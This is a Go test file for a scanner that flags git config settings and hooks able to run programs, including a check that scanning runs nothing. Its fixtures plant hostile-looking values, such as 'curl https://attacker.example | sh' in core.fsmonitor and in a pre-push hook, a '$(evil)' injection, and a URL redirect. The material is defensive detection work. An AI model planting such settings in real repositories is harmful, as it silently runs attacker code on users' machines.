package trust

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/git-revenge/gitrevenge/internal/git"
	"github.com/git-revenge/gitrevenge/internal/gittest"
)

func scan(t *testing.T, fx *gittest.Repo) []Finding {
	t.Helper()
	bin, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not installed")
	}
	dir := filepath.Join(fx.Dir, ".git")
	found, err := Scan(context.Background(), git.NewRunner(bin), dir, dir)
	if err != nil {
		t.Fatal(err)
	}
	return found
}

func names(found []Finding) []string {
	out := []string{}
	for _, f := range found {
		out = append(out, f.Kind+":"+f.Name)
	}
	slices.Sort(out)
	return out
}

func TestAnOrdinaryRepositoryHasNothingToAskAbout(t *testing.T) {
	t.Parallel()
	fx := gittest.New(t)
	fx.CommitFile("a.txt", "a\n", "one")
	// What a clone and everyday use leave in a repository's config.
	fx.Git("remote", "add", "origin", "https://example.com/o/r.git")
	fx.Git("config", "branch.main.remote", "origin")
	fx.Git("config", "branch.main.merge", "refs/heads/main")
	fx.Git("config", "user.email", "me@example.com")
	fx.Git("config", "core.autocrlf", "input")
	fx.Git("config", "core.fsmonitor", "true") // git's built-in watcher, not a program
	fx.Git("config", "pull.rebase", "true")
	fx.Git("config", "gitrevenge.cleanupOnPull", "true")
	fx.Git("config", "submodule.lib.update", "rebase")
	if found := scan(t, fx); len(found) != 0 {
		t.Errorf("found %+v", found)
	}
}

func TestSettingsThatRunProgramsAreFound(t *testing.T) {
	t.Parallel()
	fx := gittest.New(t)
	fx.CommitFile("a.txt", "a\n", "one")
	settings := map[string]string{
		"core.fsmonitor":              "sh -c 'curl https://attacker.example | sh'",
		"core.sshCommand":             "ssh -o ProxyCommand=evil",
		"core.hooksPath":              "/tmp/hooks",
		"core.editor":                 "evil",
		"core.pager":                  "evil",
		"diff.external":               "evil",
		"gpg.program":                 "evil",
		"gpg.ssh.program":             "evil",
		"credential.helper":           "!evil",
		"credential.https://x.helper": "!evil",
		"filter.x.clean":              "evil",
		"filter.x.smudge":             "evil",
		"filter.x.process":            "evil",
		"filter.lfs.smudge":           "evil-lfs smudge -- %f", // not Git LFS's own
		"diff.pdf.textconv":           "evil",
		"merge.x.driver":              "evil %O %A %B",
		"mergetool.x.cmd":             "evil",
		"remote.origin.uploadpack":    "evil",
		"remote.origin.receivepack":   "evil",
		"protocol.ext.allow":          "always",
		"pager.log":                   "evil",
		"include.path":                "../.evilconfig",
		"includeIf.gitdir:/.path":     "../.evilconfig",
		"url.https://evil/.insteadOf": "https://github.com/",
		"submodule.lib.update":        "!evil",
		"uploadpack.packObjectsHook":  "evil",
		"sequence.editor":             "evil",
	}
	var want []string
	for key, value := range settings {
		fx.Git("config", key, value)
		// git lower-cases the section and the key, and keeps the middle as written.
		first, last := strings.Index(key, "."), strings.LastIndex(key, ".")
		name := strings.ToLower(key)
		if first != last {
			name = strings.ToLower(key[:first]) + key[first:last] + strings.ToLower(key[last:])
		}
		want = append(want, "config:"+name)
	}
	// Last, and pointing at the folder itself: once set, git works from wherever it says.
	fx.Git("config", "core.worktree", filepath.ToSlash(fx.Dir))
	want = append(want, "config:core.worktree")
	slices.Sort(want)
	found := scan(t, fx)
	if got := names(found); !slices.Equal(got, want) {
		t.Errorf("found\n %v\nwant\n %v", got, want)
	}
	for _, f := range found {
		if f.Why == "" || f.Value == "" {
			t.Errorf("%s: no reason or value: %+v", f.Name, f)
		}
	}
}

func TestGitLFSsOwnFilterAndHooksArentAskedAbout(t *testing.T) {
	t.Parallel()
	fx := gittest.New(t)
	fx.CommitFile("a.txt", "a\n", "one")
	fx.Git("config", "filter.lfs.clean", "git-lfs clean -- %f")
	fx.Git("config", "filter.lfs.smudge", "git-lfs smudge -- %f")
	fx.Git("config", "filter.lfs.process", "git-lfs filter-process")
	fx.Git("config", "filter.lfs.required", "true")
	hooks := filepath.Join(fx.Dir, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	lfs := func(name string) string {
		return "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '" + name + "' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs " + name + " \"$@\"\n"
	}
	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(hooks, name), []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range []string{"pre-push", "post-checkout", "post-commit", "post-merge"} {
		write(name, lfs(name))
	}
	write("pre-commit.sample", "#!/bin/sh\nexit 0\n")
	if found := scan(t, fx); len(found) != 0 {
		t.Fatalf("Git LFS's own setup was flagged: %+v", found)
	}

	// The same files with something more in them are hooks like any other.
	write("pre-push", lfs("pre-push")+"curl https://attacker.example | sh\n")
	write("post-merge", strings.Replace(lfs("post-merge"), "exit 2; }", "$(evil); exit 2; }", 1))
	write("post-commit", "#!/bin/sh\ngit lfs post-checkout \"$@\"\n") // another hook's line
	write("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
	want := []string{"hook:post-commit", "hook:post-merge", "hook:pre-commit", "hook:pre-push"}
	if got := names(scan(t, fx)); !slices.Equal(got, want) {
		t.Errorf("found %v, want %v", got, want)
	}
}

// Looking is all Scan does: a repository set up to run a program the moment git checks its
// files runs nothing while it's scanned.
func TestScanningRunsNothingFromTheRepository(t *testing.T) {
	t.Parallel()
	fx := gittest.New(t)
	fx.CommitFile("a.txt", "a\n", "one")
	proof := filepath.Join(fx.Dir, "ran.txt")
	fx.Git("config", "core.fsmonitor", "echo ran > ran.txt; false")
	fx.Git("config", "core.pager", "echo ran > ran.txt")
	fx.Git("config", "core.editor", "echo ran > ran.txt")
	if found := scan(t, fx); len(found) != 3 {
		t.Errorf("found %+v", found)
	}
	if _, err := os.Stat(proof); err == nil {
		t.Error("scanning the repository ran its program")
	}
}
